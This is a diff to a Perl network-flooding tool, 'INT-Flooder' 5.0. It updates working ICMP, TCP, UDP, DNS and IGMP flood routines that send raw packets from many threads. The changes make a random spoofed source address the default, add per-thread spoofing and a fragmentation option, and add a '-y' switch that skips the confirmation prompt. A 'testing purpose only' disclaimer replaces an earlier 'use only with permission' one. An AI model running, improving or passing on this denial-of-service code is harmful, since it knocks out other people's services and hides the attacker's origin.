@@ -1,6 +1,6 @@
 #!/usr/bin/perl -w
-#Use only with permission of server owner or you'll might get punishment from police !!!
-#Copyright © INTmAker 2020
+#This is made for testing porpuse only and I am not responsible of any illegal use. 
+#Copyright © <INT> 2020
 
 my $depencies_loaded = eval {
   require Net::RawIP;
@@ -10,17 +10,20 @@ my $depencies_loaded = eval {
   require String::Random;
   String::Random->import(@str_random_modules);
   
+  require Net::DNS::Resolver;
+  Net::DNS::Resolver->import();
+  
   1;
 };
 if(!$depencies_loaded) {
     print "Install depencies with: 
-    sudo apt-get install libnet-rawip-perl libstring-random-perl\n\n";
+    sudo apt-get install libnet-rawip-perl libstring-random-perl libnet-dns-perl\n\n";
     
     print "Do you want to run it automaticaly? [y/n]\n";
 	my $ans = <STDIN>;
 	
 	if($ans =~ /y/i) {
-        system("sudo apt-get -y install libnet-rawip-perl libstring-random-perl");
+        system("sudo apt-get -y install libnet-rawip-perl libstring-random-perl libnet-dns-perl");
 	}
 	exit 0;
 }
@@ -34,9 +37,8 @@ use List::Util qw/ shuffle /;
 use threads;
 use threads::shared;
 use Net::Ping;
-use Net::DNS::Resolver;
 
-my ($flood_type, $data_value, $data_value_proc, $is_help);
+my ($flood_type, $data_value, $data_value_proc, $is_help, $auto_run);
 my $ARG_dest_ip = '127.0.0.1';
 my $ARG_check_fail = 0;
 my $flood_seconds = 1;
@@ -47,10 +49,10 @@ my $is_port_pinger = 0;
 my $no_threads = 0;
 my $total_packets_ = 0;
 share($total_packets_);
-my $data_size = 0;
+my $data_size = 0; my $ARG_frag = -1;
 my $flood_delay = 0;
 my $tcp_flags_str = "";
-my $ARG_src_ip = '127.0.0.1';
+my $ARG_src_ip = 'random-once';
 my (@tcp_flags, @running_threads); 
 my $VERSION = "5.0";
 		
@@ -67,6 +69,8 @@ GetOptions ("help" => \$is_help,
 			"flood-delay:i" => \$flood_delay,
 			"port-pinger" => \$is_port_pinger,
 			"no-threads" => \$no_threads,
+			"set-frag:i" => \$ARG_frag,
+			"y" => \$auto_run,
 			"hide-packet-info"   => \$hide_packets);
 if($is_help) {	&usage(); } 
 if(!($tcp_flags_str eq "")){
@@ -131,7 +135,7 @@ if($flood_seconds =~ /^\d+$/ && $flood_seconds > 0) {
     $ARG_check_fail = 1;
     print "[x] Seconds check Failed... must be an interger and greater then 0\n";  
 }
-if(!(($ARG_src_ip =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) || $ARG_src_ip eq "random-once" || $ARG_src_ip eq "random-each")){
+if(!(($ARG_src_ip =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) || $ARG_src_ip eq "random-once" || $ARG_src_ip eq "random-each" || $ARG_src_ip eq "each-thread")){
     $ARG_check_fail = 1;
     print "[x] Spoof ip check Failed...\n";  
 }
@@ -160,9 +164,10 @@ if($ARG_check_fail == 1) {
 
 	print "\n[INT-Flooder]=(".uc($flood_type)." TARGET PREPARED)>\n IP: $ARG_dest_ip | Port: ".(($ARG_dest_port) ? $ARG_dest_port : "random") ." | Seconds: $flood_seconds | DataSize: ".(($data_size) ? "$data_size-bytes" : "random") ." | Threads: $flood_threads\n";
 	print "Do you want to execute this? [y/n]\n";
-	my $ans = <STDIN>;
 	
-	if($ans =~ /y/i) {
+	my $ans = $auto_run ? 1 : <STDIN>;
+	
+	if($ans == 1 || $ans =~ /y/i) {
 		$data_value_proc = $data_value ? $data_value : get_random_string()->(1024);
         if($ARG_src_ip eq "random-once"){
             $ARG_src_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
@@ -188,8 +193,8 @@ if($ARG_check_fail == 1) {
     	
 		if ($flood_type =~ 'icmp'){
 			for(; $thread_count < $flood_threads; $thread_count += 1) {
-    	    	$flood_thread = threads->create(\&icmpflood, $ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, ($thread_count + 1));
-    	   	 print "[Thread-".($thread_count + 1)."]: Created and started!\n";
+                $flood_thread = threads->create(\&icmpflood, $ARG_dest_ip, $ARG_dest_port, $flood_seconds, $data_size, ($thread_count + 1));
+                print "[Thread-".($thread_count + 1)."]: Created and started!\n";
    			}
 		} elsif($flood_type =~ 'tcp'){
 			if($data_size > 65000) { 
@@ -237,7 +242,7 @@ sub icmpflood() {
    my($time, $endtime);
    
    $dest_ip = shift; 
-   $dest_port = shift; 
+   #$dest_port = shift; 
    $time = shift;
    $data_size = shift;
    $thread_id = shift;
@@ -250,14 +255,17 @@ sub icmpflood() {
      $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
      $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
    }
-   $dest_port = $dest_port ? $dest_port : int(rand(65535));
-
+   #$dest_port = $dest_port ? $dest_port : int(rand(65535));
+    if($ARG_src_ip eq "each-thread"){
+      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
+    }
+   
    #print "\nStarting icmp flood to $dest_ip for $flood_seconds\n";
    for (;time() <= $endtime;) {
 
       $code = int(rand(255));
       $type = int(rand(255));
-      $frag = int(rand(2));
+      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;
       
       if($ARG_src_ip eq "random-each"){
         $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
@@ -273,7 +281,7 @@ sub icmpflood() {
             daddr => $dest_ip,
             saddr => $source_ip,
             frag_off => $frag,
-         	tos => $dest_port,
+         	tos => 0,
 		 },
          icmp => {
             code => $code,
@@ -282,8 +290,14 @@ sub icmpflood() {
          }
       });
 
-      $packet->send; $total_packets_++; $packet_id++;
-      print "[Thread-$thread_id]-(ICMP Request:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] and type: $type -> code: $code, frag: $frag, tos: $dest_port\n" unless $hide_packets;
+      eval{
+        $packet->send;  
+      };
+      if($@){
+        print $@;
+      }
+      $total_packets_++; $packet_id++;
+      print "[Thread-$thread_id]-(ICMP Request:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] and type: $type -> code: $code, frag: $frag, tos: 0\n" unless $hide_packets;
       ($flood_delay != 0) and sleep $flood_delay;
 	}
    print "[Thread-$thread_id]: Flood is finished!\n";
@@ -294,7 +308,7 @@ sub icmpflood() {
 }
 
 sub tcpflood() {
-   my($thread_id, $dest_ip, $source_ip, $dest_port, $source_port, $frag);
+   my($thread_id, $dest_ip, $source_ip, $dest_port, $dest_port_, $source_port, $frag);
    my($packet_size, $packet_data, $packet_id);
    my($data_size, $is_custom_flags);
    my($urg, $psh, $rst, $fin, $syn, $ack);
@@ -323,14 +337,17 @@ sub tcpflood() {
 	  $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
 	  $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
     }
-
+    if($ARG_src_ip eq "each-thread"){
+      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
+    }
+   
     #print "\nStarting tcp flood to $dest_ip for $flood_seconds seconds.\n";
     for (;time() <= $endtime;) {
    
       $source_port = int(rand(65535)); #rand pocinje od 0
-      $dest_port = $dest_port ? $dest_port : int(rand(65535));
-	  $frag = int(rand(2));
-		
+      $dest_port_ = $dest_port ? $dest_port : int(rand(65535));
+      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;
+      
       if(scalar(@tcp_flags) == 0){
       	$urg = int(rand(2)); 
       	$psh = int(rand(2));
@@ -358,7 +375,7 @@ sub tcpflood() {
          },
          tcp => {
             source => $source_port,
-            dest => $dest_port,
+            dest => $dest_port_,
             urg => $urg,
             psh => $psh,
             rst => $rst,
@@ -369,9 +386,15 @@ sub tcpflood() {
          }
       });
 
-      $packet->send;  
-	  $total_packets_++; $packet_id++; 
-      print "\n[Thread-$thread_id]-(TCP Packet:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port, frag: $frag\n-> Flags: urg: $urg, psh: $psh, rst: $rst, fin: $fin, syn: $syn, ack: $ack\n" unless $hide_packets;
+      eval{
+        $packet->send;  
+      };
+      if($@){
+       print "\n[Thread-$thread_id]-(TCP Packet:$packet_id) Rejected with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port_, frag: $frag\n-> Flags: urg: $urg, psh: $psh, rst: $rst, fin: $fin, syn: $syn, ack: $ack\n" unless $hide_packets;
+      } else {
+        $total_packets_++; $packet_id++; 
+        print "\n[Thread-$thread_id]-(TCP Packet:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port_, frag: $frag\n-> Flags: urg: $urg, psh: $psh, rst: $rst, fin: $fin, syn: $syn, ack: $ack\n" unless $hide_packets;
+      }
       ($flood_delay != 0) and sleep $flood_delay;
    }
    print "[Thread-$thread_id]: Flood is finished!\n";
@@ -383,7 +406,7 @@ sub tcpflood() {
 
 sub udpflood() {
    #my($dest_ip, $dest_port, $time, $data_size, $thread_id, $data_value_proc, $endtime, $source_port, $frag, $packet_data, $packet_size, $packet_id);
-   my($thread_id, $dest_ip, $source_ip, $dest_port, $source_port, $frag);
+   my($thread_id, $dest_ip, $source_ip, $dest_port, $dest_port_, $source_port, $frag);
    my($packet_size, $packet_data, $packet_id);
    my($data_size);
    my($time, $endtime);
@@ -397,6 +420,10 @@ sub udpflood() {
    $source_ip = $ARG_src_ip;
    $endtime = time() + ($time ? $time : 1000000);
    
+    if($ARG_src_ip eq "each-thread"){
+      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
+    }
+   
     if($data_size == -1) { $packet_data = 0 } else {
 	  $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
 	  $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
@@ -406,9 +433,9 @@ sub udpflood() {
    for (;time() <= $endtime;) {
 
       $source_port = int(rand(255));
-	  $dest_port = $dest_port ? $dest_port : int(rand(65500))+1;
-      $frag = int(rand(2));
-
+	  $dest_port_ = $dest_port ? $dest_port : int(rand(65500))+1;
+      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;
+      
       if($ARG_src_ip eq "random-each"){
         $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
       }
@@ -426,13 +453,20 @@ sub udpflood() {
          },
          udp => {
             source => $source_port,
-            dest => $dest_port,
+            dest => $dest_port_,
    			data => $packet_data,
          }
       });
 
-      $packet->send; $packet_id++; $total_packets_++;
-	  print "[Thread-$thread_id]-(UDP Packet:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port, frag: $frag\n" unless $hide_packets;
+      eval{
+        $packet->send;  
+      };
+      if($@){
+        print "[Thread-$thread_id]-(UDP Packet:$packet_id) Rejected with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port   $source_port to $dest_port_, frag: $frag\n" unless $hide_packets;
+      } else {
+        $packet_id++; $total_packets_++;
+        print "[Thread-$thread_id]-(UDP Packet:$packet_id) Sent with data[type: ".($data_value ? "input" : "random").", size: ".($packet_size ? $packet_size:"0")."] from port $source_port to $dest_port_, frag: $frag\n" unless $hide_packets;
+      }
       ($flood_delay != 0) and sleep $flood_delay;
    }
    print "[Thread-$thread_id]: Flood is finished!\n";
@@ -463,7 +497,10 @@ sub dnsflood() {
    $packet_id = 0;
    $source_ip = $ARG_src_ip;
    $endtime = time() + ($time ? $time : 1000000);
-
+    if($ARG_src_ip eq "each-thread"){
+      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
+    }
+   
     for (;time() <= $endtime; $k++) {
       if ($k > 50) {#regen random domain
          $str_random_doman = @latters[int rand(9)]; $k = 0;
@@ -522,10 +559,13 @@ sub igmpflood(){
 	  $packet_size = $data_size ? $data_size : int(rand(1024-64)+64);
 	  $packet_data = "\002\r\n".pack("a$packet_size", $data_value_proc). "\003";
     }
-
+    if($ARG_src_ip eq "each-thread"){
+      $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
+    }
+   
    for (;time() <= $endtime;) {
 
-      $frag = int(rand(2));
+      $frag = ($ARG_frag == -1) ? int(rand(2)) : $ARG_frag;
 
       if($ARG_src_ip eq "random-each"){
         $source_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
@@ -635,13 +675,16 @@ Options:
 	-data-value <string> - by default it's random string
 	-threads <integer> - by default it's 1, use with strong cpu 
 	-set-flags <tcpflag1,tcpflag2,...> - separate flags by comma [tcp only]
-	-spoof-ip <ipv4,random-once,random-each> - by default it's your ext. ip
+	-set-frag - 1 for fragmented packets, 0 for no f. Defualt it random.
+	-spoof-ip <ipv4,random-once,random-each> - by default it's random-once
 	-old-sockets - this is only for udp if you want to use old sockets
 	-no-threads - disables threads so it runs directly
 	-hide-packet-info - no messages from packets			
 	-flood-delay - delay between creating packets
+   Extras:
+	-port-pinger - this enables port ping mode
     
-[By INT] more soon...\n\n";
+[By <INT>] more soon...\n\n";
    
    exit 0;
 }
